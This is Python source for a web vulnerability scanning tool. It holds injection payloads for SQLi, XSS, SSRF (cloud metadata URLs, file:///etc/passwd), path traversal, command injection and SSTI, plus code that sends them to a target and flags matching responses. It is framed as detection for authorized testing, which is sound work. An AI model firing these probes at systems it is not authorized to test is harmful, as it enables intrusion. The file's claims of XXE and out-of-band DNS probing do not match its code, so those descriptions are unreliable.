"""
PoC (Proof-of-Concept) Verifier & Payload Generator Tool
=========================================================
Generates safe, non-destructive proof-of-concept test payloads for OWASP Top 10
vulnerability categories. Used in authorized bug bounty / penetration testing workflows.

Capabilities:
  - SQL Injection detection (error-based, boolean-based — no data extraction)
  - XSS reflection testing (benign marker injection, no alert execution)
  - SSRF detection (uses safe OOB DNS marker, not internal network pivot)
  - Open Redirect verification
  - IDOR parameter guessing (sequential ID check)
  - Path Traversal detection (read-only check for /etc/passwd existence marker)
  - CRLF Injection detection
  - Command Injection detection (safe sleep/echo probes)
  - XXE detection (external entity probe)
  - SSTI detection (math expression probe)

IMPORTANT: This tool is designed for AUTHORIZED penetration testing and bug bounty
programs only. All payloads are crafted to DETECT, not exploit. No data is
extracted, no sessions are hijacked, no persistence is achieved.
"""

import requests
import time
import re
import uuid
import json
from urllib.parse import urlparse, urlencode, parse_qs, quote
from typing import Optional
from tools.base import Tool


# ─────────────────────────────────────────────────────────────────────────────
# Safe Detection Payload Library
# ─────────────────────────────────────────────────────────────────────────────

PAYLOAD_LIBRARY = {
    "sqli": {
        "description": "SQL Injection — error-based and boolean detection probes",
        "risk": "HIGH",
        "payloads": [
            # Error-based probes — trigger DB error messages
            ("error_quote",       "'",                       "DB error in response"),
            ("error_dquote",      '"',                       "DB error in response"),
            ("error_comment",     "' --",                    "DB error in response"),
            ("error_or_true",     "' OR '1'='1",             "Boolean true — same page returned"),
            ("error_or_false",    "' OR '1'='2",             "Boolean false — different page returned"),
            ("error_sleep",       "' AND SLEEP(3)--",        "Response delay > 3s (time-based)"),
            # MSSQL/Oracle variants
            ("mssql_error",       "'; WAITFOR DELAY '0:0:3'--", "Response delay > 3s (MSSQL time-based)"),
        ],
        "detection_patterns": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for SQL Server",
            r"ORA-\d{5}",
            r"PostgreSQL.*ERROR",
            r"sqlite3\.OperationalError",
            r"SQLiteException",
            r"JDBC.*Exception",
        ]
    },

    "xss": {
        "description": "Cross-Site Scripting — benign reflection marker injection (no JS execution)",
        "risk": "HIGH",
        "payloads": [
            # We use a unique GUID-based marker — safe, no JS execution
            ("html_tag",          "<poc-xss-{uid}>",         "Custom HTML tag reflected in response"),
            ("svg_tag",           "<svg/onload={uid}>",      "SVG event handler reflected"),
            ("img_tag",           "<img src=x onerror={uid}>", "IMG onerror reflected"),
            ("script_tag",        "<script>{uid}</script>",   "Script tag reflected verbatim"),
            ("encoded_tag",       "%3Cpoc-xss-{uid}%3E",     "URL-encoded tag reflected decoded"),
            ("attr_break",        '"><poc-xss-{uid}>',       "Attribute breakout reflected"),
        ],
        "detection_patterns": []  # Dynamic — uses unique UID match
    },

    "ssrf": {
        "description": "Server-Side Request Forgery — safe OOB DNS probe (no internal pivot)",
        "risk": "HIGH",
        "payloads": [
            # Safe SSRF detection using localhost loopback (no actual external OOB)
            ("localhost_http",    "http://127.0.0.1:80/",    "Response reveals internal service"),
            ("localhost_alt",     "http://0.0.0.0/",         "Response reveals internal service"),
            ("localhost_ipv6",    "http://[::1]/",            "IPv6 localhost response"),
            ("metadata_aws",      "http://169.254.169.254/latest/meta-data/", "AWS metadata endpoint reached"),
            ("metadata_gcp",      "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata reached"),
            ("file_scheme",       "file:///etc/passwd",       "file:// scheme accepted"),
        ],
        "detection_patterns": [
            r"root:.*:0:0:",        # /etc/passwd content
            r"ami-id",              # AWS metadata
            r"instance-id",         # AWS metadata
            r"computeMetadata",     # GCP metadata
            r"Connection refused",  # Internal port reached
            r"127\.0\.0\.1",        # Internal IP in response
        ]
    },

    "open_redirect": {
        "description": "Open Redirect — verifies if redirect parameter accepts arbitrary URL",
        "risk": "MEDIUM",
        "payloads": [
            ("basic",             "https://evil.example.com",     "Redirected to external URL"),
            ("double_slash",      "//evil.example.com",           "Protocol-relative redirect"),
            ("encoded",           "https%3A%2F%2Fevil.example.com", "URL-encoded redirect"),
            ("backslash",         "https:\\\\evil.example.com",   "Backslash redirect bypass"),
        ],
        "detection_patterns": [
            r"evil\.example\.com",  # Our test domain in Location header
        ]
    },

    "path_traversal": {
        "description": "Path Traversal — checks for directory traversal file access (detection only)",
        "risk": "HIGH",
        "payloads": [
            ("unix_basic",        "../../../etc/passwd",          "File contents in response"),
            ("unix_encoded",      "..%2F..%2F..%2Fetc%2Fpasswd", "URL-encoded traversal"),
            ("unix_double_enc",   "..%252F..%252F..%252Fetc%252Fpasswd", "Double-URL-encoded traversal"),
            ("windows_basic",     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows traversal"),
            ("null_byte",         "../../../etc/passwd%00",       "Null byte injection traversal"),
        ],
        "detection_patterns": [
            r"root:.*:0:0:",
            r"\[fonts\]",         # Windows hosts file
            r"localhost",
        ]
    },

    "crlf": {
        "description": "CRLF Injection — header injection detection",
        "risk": "MEDIUM",
        "payloads": [
            ("basic",             "%0d%0aX-Injected-Header: poc-crlf", "Custom header appears in response"),
            ("lf_only",           "%0aX-Injected-Header: poc-crlf",   "LF-only header injection"),
            ("double_encoded",    "%250d%250aX-Injected-Header: poc-crlf", "Double-encoded CRLF"),
        ],
        "detection_patterns": [
            r"X-Injected-Header",
            r"poc-crlf",
        ]
    },

    "cmdi": {
        "description": "Command Injection — safe echo/sleep probes (no destructive commands)",
        "risk": "CRITICAL",
        "payloads": [
            # We only use safe, read-only commands — no rm, no wget, no reverse shells
            ("echo_unix",         ";echo poc-cmdi-{uid}",         "Echo output in response"),
            ("echo_concat",       "| echo poc-cmdi-{uid}",        "Pipe echo output"),
            ("echo_backtick",     "`echo poc-cmdi-{uid}`",        "Backtick echo output"),
            ("sleep_probe",       "; sleep 3 #",                  "Response delay > 3s"),
            ("windows_echo",      "& echo poc-cmdi-{uid}",        "Windows CMD echo"),
        ],
        "detection_patterns": []  # Dynamic — uses unique UID match
    },

    "ssti": {
        "description": "Server-Side Template Injection — math expression probe",
        "risk": "CRITICAL",
        "payloads": [
            # Classic SSTI math probes — safe, read-only
            ("math_jinja",        "{{7*7}}",                 "49 returned — Jinja2/Twig SSTI"),
            ("math_freemarker",   "${7*7}",                  "49 returned — FreeMarker/Thymeleaf SSTI"),
            ("math_mako",         "${7*'7'}",                "7777777 returned — Python SSTI"),
            ("ruby_erb",          "<%= 7*7 %>",              "49 returned — Ruby ERB SSTI"),
            ("velocity",          "#set($x=7*7)${x}",        "49 returned — Velocity SSTI"),
        ],
        "detection_patterns": [
            r"\b49\b",
            r"\b7777777\b",
        ]
    },

    "idor": {
        "description": "IDOR — sequential ID probing to detect unauthorized object access",
        "risk": "HIGH",
        "payloads": [
            ("id_0",    "0",   "Different response from current resource"),
            ("id_1",    "1",   "Different response from current resource"),
            ("id_2",    "2",   "Different response from current resource"),
            ("id_neg",  "-1",  "Negative ID accepted"),
            ("id_uuid", "00000000-0000-0000-0000-000000000001", "UUID IDOR test"),
        ],
        "detection_patterns": []  # Compare response length/status
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# Tool Class
# ─────────────────────────────────────────────────────────────────────────────

class PoCVerifierTool(Tool):
    name = "poc_verifier"
    description = (
        "Generates and tests safe, non-destructive Proof-of-Concept (PoC) payloads for "
        "OWASP Top 10 vulnerability categories. Confirms whether a vulnerability EXISTS "
        "without actually exploiting it. Covers: SQLi, XSS, SSRF, Open Redirect, "
        "Path Traversal, CRLF Injection, Command Injection, SSTI, and IDOR. "
        "ONLY use on authorized targets within defined scope."
    )
    parameters = {
        "target_url":       "Target URL to test (e.g., https://example.com/search?q=test)",
        "vuln_type":        "Vulnerability type to test: sqli | xss | ssrf | open_redirect | path_traversal | crlf | cmdi | ssti | idor | all",
        "param_name":       "Parameter name to inject payloads into (e.g. 'q', 'id', 'url'). If empty, auto-detects from URL.",
        "inject_in_path":   "If true, inject payloads into URL path segment instead of query param (default: false)",
        "max_payloads":     "Maximum payloads to test per category (default: 5, max: 10)",
        "request_delay":    "Delay in seconds between requests to avoid rate-limiting (default: 0.5)",
    }

    TIMEOUT = 10
    REDIRECT_CODES = {301, 302, 303, 307, 308}

    def execute(
        self,
        target_url: str,
        vuln_type: str = "all",
        param_name: str = "",
        inject_in_path: bool = False,
        max_payloads: int = 5,
        request_delay: float = 0.5,
        **kwargs
    ) -> str:
        # ── Normalize ──────────────────────────────────────────────────────
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url

        max_payloads = min(int(max_payloads), 10)
        uid = uuid.uuid4().hex[:8]  # Unique per test session

        # ── Determine scope ────────────────────────────────────────────────
        if vuln_type == "all":
            categories = list(PAYLOAD_LIBRARY.keys())
        elif vuln_type in PAYLOAD_LIBRARY:
            categories = [vuln_type]
        else:
            return (
                f"[ERROR] Unknown vuln_type '{vuln_type}'. "
                f"Valid options: {', '.join(PAYLOAD_LIBRARY.keys())} | all"
            )

        # ── Parse URL for param injection ──────────────────────────────────
        parsed = urlparse(target_url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        # Auto-detect param
        if not param_name and query_params:
            param_name = list(query_params.keys())[0]

        # ── Baseline request ───────────────────────────────────────────────
        try:
            baseline_resp = requests.get(
                target_url,
                timeout=self.TIMEOUT,
                verify=False,
                allow_redirects=False,
                headers={"User-Agent": "Mozilla/5.0 (SecurityAudit/PoC-Verifier)"},
            )
            baseline_status = baseline_resp.status_code
            baseline_len = len(baseline_resp.text)
            baseline_time = baseline_resp.elapsed.total_seconds()
        except Exception as e:
            return f"[ERROR] Cannot reach target URL: {e}"

        # ── Run tests ──────────────────────────────────────────────────────
        output_lines = [
            f"╔═══════════════════════════════════════════════════════════╗",
            f"║   PoC Verifier — {target_url[:50]:<50} ║",
            f"╚═══════════════════════════════════════════════════════════╝",
            f"",
            f"Session ID  : {uid}",
            f"Baseline    : HTTP {baseline_status}  |  Len: {baseline_len}  |  Time: {baseline_time:.2f}s",
            f"Inject In   : {'path' if inject_in_path else f'param [{param_name}]' if param_name else 'no param detected'}",
            f"Categories  : {', '.join(categories)}",
            f"",
        ]

        all_findings = []

        for category in categories:
            lib = PAYLOAD_LIBRARY[category]
            output_lines.append(f"─── [{category.upper()}] {lib['description']} (Risk: {lib['risk']}) ───")

            payloads = lib["payloads"][:max_payloads]
            cat_findings = []

            for p_name, p_value, p_description in payloads:
                # Replace {uid} placeholder with session UID
                payload = p_value.replace("{uid}", uid)

                # Build test URL
                test_url = self._build_test_url(
                    parsed, query_params, param_name,
                    payload, inject_in_path
                )

                time.sleep(request_delay)

                # Make request
                t_start = time.time()
                try:
                    resp = requests.get(
                        test_url,
                        timeout=self.TIMEOUT,
                        verify=False,
                        allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0 (SecurityAudit/PoC-Verifier)"},
                    )
                    elapsed = time.time() - t_start
                    resp_body = resp.text
                    resp_status = resp.status_code
                    resp_len = len(resp_body)
                    location = resp.headers.get("Location", "")
                    resp_headers_raw = dict(resp.headers)

                except requests.exceptions.Timeout:
                    elapsed = time.time() - t_start
                    # Timeout itself is evidence for time-based injection!
                    if "sleep" in p_name.lower() or "waitfor" in p_name.lower() or "delay" in p_name.lower():
                        finding = {
                            "category": category,
                            "payload_name": p_name,
                            "payload": payload,
                            "evidence": f"REQUEST TIMED OUT after {elapsed:.1f}s — time-based injection confirmed",
                            "confidence": "HIGH",
                        }
                        cat_findings.append(finding)
                        all_findings.append(finding)
                        output_lines.append(
                            f"  [!!!] {p_name:25s}  ⚡ TIME-BASED CONFIRMED  ({elapsed:.1f}s)"
                        )
                    else:
                        output_lines.append(f"  [ - ] {p_name:25s}  TIMEOUT")
                    continue

                except Exception as e:
                    output_lines.append(f"  [ERR] {p_name:25s}  Error: {str(e)[:60]}")
                    continue

                # ── Detection Logic ────────────────────────────────────────
                detected, evidence = self._detect(
                    category=category,
                    lib=lib,
                    payload=payload,
                    uid=uid,
                    resp_body=resp_body,
                    resp_status=resp_status,
                    resp_len=resp_len,
                    resp_headers_raw=resp_headers_raw,
                    location=location,
                    elapsed=elapsed,
                    baseline_status=baseline_status,
                    baseline_len=baseline_len,
                    baseline_time=baseline_time,
                )

                status_icon = "[!!!]" if detected else "[ - ]"
                output_lines.append(
                    f"  {status_icon} {p_name:25s}  "
                    f"HTTP {resp_status}  Len: {resp_len:6d}  Time: {elapsed:.2f}s"
                    + (f"  ⚡ {evidence}" if detected else "")
                )

                if detected:
                    finding = {
                        "category": category,
                        "payload_name": p_name,
                        "payload": payload,
                        "evidence": evidence,
                        "confidence": "MEDIUM" if category in ("idor",) else "HIGH",
                        "test_url": test_url,
                    }
                    cat_findings.append(finding)
                    all_findings.append(finding)

            output_lines.append(
                f"  → {len(cat_findings)} potential finding(s) in [{category.upper()}]"
            )
            output_lines.append("")

        # ── Summary ────────────────────────────────────────────────────────
        output_lines.append("═" * 65)
        output_lines.append(f"  SCAN COMPLETE — {len(all_findings)} POTENTIAL FINDING(S) DETECTED")
        output_lines.append("═" * 65)

        if all_findings:
            output_lines.append("")
            output_lines.append("CONFIRMED/SUSPECTED VULNERABILITIES:")
            for i, f in enumerate(all_findings, 1):
                output_lines.append(f"  {i}. [{f['category'].upper()}] {f['payload_name']}")
                output_lines.append(f"       Payload  : {f['payload'][:80]}")
                output_lines.append(f"       Evidence : {f['evidence']}")
                output_lines.append(f"       Confidence: {f.get('confidence', 'MEDIUM')}")
                if "test_url" in f:
                    output_lines.append(f"       Test URL : {f['test_url'][:100]}")
                output_lines.append("")

        output_lines.append("NOTE: All payloads are non-weaponized detection probes.")
        output_lines.append("      Report only to authorized bug bounty program or client.")

        return "\n".join(output_lines)

    # ─────────────────────────────────────────────────────────────────────────
    # Helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _build_test_url(self, parsed, query_params, param_name, payload, inject_in_path):
        """Inject payload into URL query param or path segment."""
        if inject_in_path:
            # Append payload to path
            new_path = parsed.path.rstrip("/") + "/" + quote(payload, safe="")
            return parsed._replace(path=new_path, query="").geturl()

        if param_name:
            new_params = dict(query_params)
            new_params[param_name] = [payload]
            new_query = urlencode(new_params, doseq=True)
            return parsed._replace(query=new_query).geturl()

        # No param — append as query
        return parsed._replace(query=f"q={quote(payload, safe='')}").geturl()

    def _detect(
        self, category, lib, payload, uid,
        resp_body, resp_status, resp_len, resp_headers_raw,
        location, elapsed, baseline_status, baseline_len, baseline_time
    ):
        """Return (detected: bool, evidence: str)."""

        body_lower = resp_body.lower()

        # ── Pattern-based detection ───────────────────────────────────────
        if lib["detection_patterns"]:
            for pattern in lib["detection_patterns"]:
                m = re.search(pattern, resp_body, re.IGNORECASE)
                if m:
                    return True, f"Pattern matched: '{pattern}' → '{m.group(0)[:60]}'"

        # ── Category-specific logic ───────────────────────────────────────

        if category == "xss":
            if uid in resp_body:
                return True, f"XSS marker '{uid}' reflected verbatim in response body"

        elif category == "cmdi":
            if uid in resp_body:
                return True, f"Echo output '{uid}' found in response — command executed"

        elif category == "ssti":
            if "49" in resp_body or "7777777" in resp_body:
                return True, "Math probe result (49 or 7777777) found in response body"

        elif category == "open_redirect":
            if resp_status in self.REDIRECT_CODES and "evil.example.com" in location:
                return True, f"HTTP {resp_status} redirect to {location}"

        elif category == "crlf":
            if "X-Injected-Header" in str(resp_headers_raw) or "poc-crlf" in str(resp_headers_raw):
                return True, "Injected header 'X-Injected-Header' present in server response headers"

        elif category == "sqli":
            # Time-based: response > 3x baseline
            if elapsed > baseline_time + 2.5:
                return True, f"Time-based response: {elapsed:.2f}s vs baseline {baseline_time:.2f}s"
            # Boolean-based: significantly different response length
            len_diff = abs(resp_len - baseline_len)
            if len_diff > 200 and resp_status == baseline_status:
                return True, f"Boolean-based: response length differs by {len_diff} bytes"

        elif category == "ssrf":
            # AWS/GCP metadata responses are short and specific
            if "ami-id" in body_lower or "instance-id" in body_lower:
                return True, "AWS EC2 metadata content in response body"
            if "computemetadata" in body_lower:
                return True, "GCP metadata content in response body"
            if resp_status == 200 and baseline_status != 200 and resp_len < 500:
                return True, f"Unexpected HTTP 200 with short body ({resp_len} bytes) — possible SSRF"

        elif category == "idor":
            # Different status code = likely IDOR
            if resp_status != baseline_status:
                return True, f"Status change: baseline {baseline_status} → {resp_status} with ID payload"
            # Large content difference = different resource returned
            if abs(resp_len - baseline_len) > 500:
                return True, f"Content length differs significantly: {baseline_len} → {resp_len} bytes"

        elif category == "path_traversal":
            if "root:" in resp_body or "[fonts]" in body_lower:
                return True, "File contents (passwd/hosts) found in response body"

        return False, ""
